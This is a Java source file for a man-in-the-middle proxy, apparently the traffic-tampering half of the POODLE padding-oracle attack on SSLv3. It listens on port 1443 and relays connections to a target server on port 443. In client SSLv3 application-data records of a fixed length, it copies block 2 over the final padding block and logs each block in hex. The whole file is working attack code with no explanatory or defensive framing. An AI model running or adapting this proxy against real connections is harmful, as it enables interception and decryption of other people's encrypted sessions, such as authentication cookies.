import java.io.*;
import java.util.*;
import java.net.*;
import net.jumperz.util.*;

public class Mitm
{
public static final int BLOCKSIZE = 16;
private static final int HEADERSIZE = 5;
private String host;
private ServerSocket ss = null;
private Socket serverSideSocket = null;
private volatile boolean terminated = false;

public byte[] block0;
public byte[] block1;
public byte[] block2;
public byte[] block3;
public byte[] block4;
public byte[] block5;
//--------------------------------------------------------------------------------
public Mitm( final String h )
{
this.host = h;
}
//--------------------------------------------------------------------------------
public void shutdown()
{
terminated = true;
MSystemUtil.closeSocket( ss );
MSystemUtil.closeSocket( serverSideSocket );
}
//--------------------------------------------------------------------------------
public void bite()
{
try
	{
	ss = new ServerSocket( 1443, 10 );
	}
catch( Exception e )
	{
	e.printStackTrace();
	return;
	}

while( !terminated )
	{
	try
		{
		biteImpl( ss );
		}
	catch( Exception e )
		{
		p( e );
		}
	}
}
//--------------------------------------------------------------------------------
public void biteImpl( final ServerSocket ss )
throws Exception
{
final Socket clientSideSocket = ss.accept();
p( "connected:" + clientSideSocket );

	//Connect to SSLv3 Server
final Socket serverSideSocket = new Socket( host, 443 );
	
	//Server to Client thread
new Thread(){
public void run()
{
try
	{
	while( !terminated )
		{
		byte[] buf = new byte[ 1024 * 10 ];
		int r = serverSideSocket.getInputStream().read( buf );
		p( "\tS-C:" + r );
		if( r <= 0 )
			{
			clientSideSocket.getOutputStream().close();
			break;
			}
		clientSideSocket.getOutputStream().write( buf, 0, r );
		}
	}
catch( Exception e )
	{
	p( e );
	}
}
}.start();

	//Client to Server
while( !terminated )
	{
	byte[] buf = new byte[ 1024 * 10 ];
	int r = clientSideSocket.getInputStream().read( buf );
	if( r <= 0 )
		{
		clientSideSocket.close();
		serverSideSocket.close();
		break;
		}
	p( "C-S:" + r );
	
	if( r == ( 85 + BLOCKSIZE ) )
		{
			//application data
		if( buf[ 0 ] == ( byte )0x17 &&
		    buf[ 1 ] == ( byte )0x03 &&
		    buf[ 2 ] == ( byte )0x00 )
			{
			p( "Application data" );
			
			block0 = new byte[ BLOCKSIZE ];
			block1 = new byte[ BLOCKSIZE ];
			block2 = new byte[ BLOCKSIZE ];
			block3 = new byte[ BLOCKSIZE ];
			block4 = new byte[ BLOCKSIZE ];
			block5 = new byte[ BLOCKSIZE ];
				
			byte[][] blocks = new byte[][]{ block0, block1, block2, block3, block4, block5 };
			int offset = 0;
			for( int i = 0; i < 6; ++i )
				{
				for( int k = 0; k < BLOCKSIZE; ++k, ++offset )
					{
					blocks[ i ][ k ] = buf[ HEADERSIZE + offset ];
					}
				p(  "block" + i + ": " + MStringUtil.byteToHexString( blocks[ i ] ) );
				}
				
				//overwrite block 5 with block 2
			for( int i = 0; i < BLOCKSIZE; ++i )
				{
				buf[ HEADERSIZE + ( BLOCKSIZE * 5 ) + i ] = block2[ i ];
				}
			}
		}
	serverSideSocket.getOutputStream().write( buf, 0, r );
	}
}
//--------------------------------------------------------------------------------
public void p( Object o )
{
System.out.println( o );
}
//--------------------------------------------------------------------------------
}